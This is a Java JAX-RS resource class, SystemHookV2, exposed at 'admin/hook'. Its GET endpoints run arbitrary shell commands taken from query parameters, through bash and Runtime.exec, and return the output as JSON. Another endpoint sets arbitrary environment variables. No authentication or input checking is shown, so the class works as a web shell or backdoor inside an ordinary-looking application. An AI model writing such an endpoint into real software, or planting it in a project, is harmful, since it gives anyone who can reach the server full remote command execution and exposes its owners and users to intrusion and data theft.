package resource.hook;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Collectors;
import javax.ejb.Singleton;
import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.MediaType;

/**
 *
 * @author alonsocucei
 */
@Singleton
@Path("admin/hook")
public class SystemHookV2 {

    private ProcessBuilder processBuilder = new ProcessBuilder("bash");

    public SystemHookV2() {
    }

    @GET
    @Produces({MediaType.APPLICATION_JSON})
    public Map<String, List<String>> command(@QueryParam("cd") String dir, @QueryParam("c") String commands) {
        Map<String, List<String>> output = new HashMap<>();
        
        if (dir != null && !dir.isEmpty()) {
            processBuilder.directory(new File(dir));
        }
        
        if (commands.length() > 0) {
            processBuilder.command(commands.split(" "));

            try {
                Process process = processBuilder.start();
                BufferedReader standardMessages = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorMessages = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                output.put("messages:", standardMessages.lines().collect(Collectors.toList()));
                output.put("errors:", errorMessages.lines().collect(Collectors.toList()));
            } catch (IOException ex) {
                Logger.getLogger(SystemHookV2.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        
        return output;
    }

    @GET
    @Path("/env")
    @Produces({MediaType.APPLICATION_JSON})
    public void env(@QueryParam("name") String name, @QueryParam("value") String value) {
        processBuilder.environment().put(name, value);
    }

    @GET
    @Path("/exec")
    @Produces({MediaType.APPLICATION_JSON})
    public Map<String, List<String>> exec(@QueryParam("c") String commands) {
        Map<String, List<String>> output = new HashMap<>();
        List<String> commandsList = Arrays.asList(commands.split(";"));

        for (String command : commandsList) {
            try {
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader standardMessages = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorMessages = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                output.put("<" + command + "> messages:", standardMessages.lines().collect(Collectors.toList()));
                output.put("<" + command + "> errors:", errorMessages.lines().collect(Collectors.toList()));
            } catch (IOException ex) {
                output.put("errors:", Arrays.asList(ex.toString()));
                break;
            }
        }

        return output;
    }
}
